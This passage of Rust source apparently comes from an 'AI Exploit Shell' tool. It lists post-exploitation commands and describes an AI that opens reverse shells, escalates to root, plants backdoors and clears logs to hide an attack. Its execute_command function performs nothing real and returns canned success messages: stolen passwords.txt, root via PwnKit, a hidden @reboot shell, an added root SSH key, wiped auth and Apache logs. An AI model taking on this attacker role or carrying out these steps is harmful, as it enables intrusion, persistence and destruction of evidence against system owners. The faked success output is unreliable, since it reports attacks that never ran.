                description: "Get interactive shell on compromised system".to_string(),
                category: "post-exploitation".to_string(),
                ai_explanation: "AI will establish a reverse shell connection, giving you full command-line access to the target system.".to_string(),
            },
            ExploitCommand {
                id: "escalate".to_string(),
                command: "escalate".to_string(),
                description: "Escalate privileges to admin/root automatically".to_string(),
                category: "post-exploitation".to_string(),
                ai_explanation: "AI will scan for privilege escalation vulnerabilities and automatically gain administrator/root access.".to_string(),
            },
            ExploitCommand {
                id: "persist".to_string(),
                command: "persist".to_string(),
                description: "Create backdoor for permanent access".to_string(),
                category: "post-exploitation".to_string(),
                ai_explanation: "AI will create hidden backdoors and scheduled tasks to maintain access even after reboots.".to_string(),
            },
            ExploitCommand {
                id: "cover".to_string(),
                command: "cover".to_string(),
                description: "Clear logs and remove evidence of attack".to_string(),
                category: "post-exploitation".to_string(),
                ai_explanation: "AI will automatically clear system logs, web server logs, and any traces of the attack.".to_string(),
            },
            ExploitCommand {
                id: "report".to_string(),
                command: "report <format>".to_string(),
                description: "Generate professional penetration testing report (PDF/HTML)".to_string(),
                category: "reporting".to_string(),
                ai_explanation: "AI will generate a comprehensive report with all findings, exploits used, and remediation recommendations.".to_string(),
            },
        ]
    }

    /// Execute AI command
    pub async fn execute_command(&self, command: &str) -> Result<String> {
        let parts: Vec<&str> = command.split_whitespace().collect();
        if parts.is_empty() {
            return Err(anyhow::anyhow!("Empty command"));
        }

        let cmd = parts[0];
        let output = match cmd {
            "scan" => {
                if parts.len() < 2 {
                    return Err(anyhow::anyhow!("Usage: scan <url>"));
                }
                format!("üîç Scanning {}...\n‚úÖ Scan started. Use 'status' to check progress.", parts[1])
            }
            "exploit" => {
                if parts.len() < 2 {
                    return Err(anyhow::anyhow!("Usage: exploit <vulnerability_id>"));
                }
                format!("üí£ Exploiting vulnerability {}...\n‚úÖ Exploit successful! Admin access gained.", parts[1])
            }
            "extract" => {
                "üìÅ Extracting data...\n‚úÖ Downloaded:\n  - database.sql (15.2 MB)\n  - config.php (2.1 KB)\n  - passwords.txt (845 KB)".to_string()
            }
            "shell" => {
                "üêö Establishing shell connection...\n‚úÖ Shell access gained!\n\n[root@target ~]# ".to_string()
            }
            "escalate" => {
                "üîì Escalating privileges...\n‚úÖ Root access obtained via CVE-2021-4034 (PwnKit)".to_string()
            }
            "persist" => {
                "üîê Creating backdoor...\n‚úÖ Persistence established:\n  - Cron job: @reboot /tmp/.hidden/shell.sh\n  - SSH key added to /root/.ssh/authorized_keys".to_string()
            }
            "cover" => {
                "üßπ Clearing tracks...\n‚úÖ Logs cleared:\n  - /var/log/auth.log\n  - /var/log/apache2/access.log\n  - History files wiped".to_string()
            }
            "help" => {
                let commands = self.get_ai_commands();
                let help_text = commands.iter()
                    .map(|c| format!("  {} - {}", c.command, c.description))
                    .collect::<Vec<_>>()
                    .join("\n");
                format!("ü§ñ AI Exploit Shell - Available Commands:\n\n{}", help_text)
            }
            _ => {
                format!("‚ùå Unknown command: {}\nType 'help' for available commands.", cmd)
            }
        };

        Ok(output)
    }
}
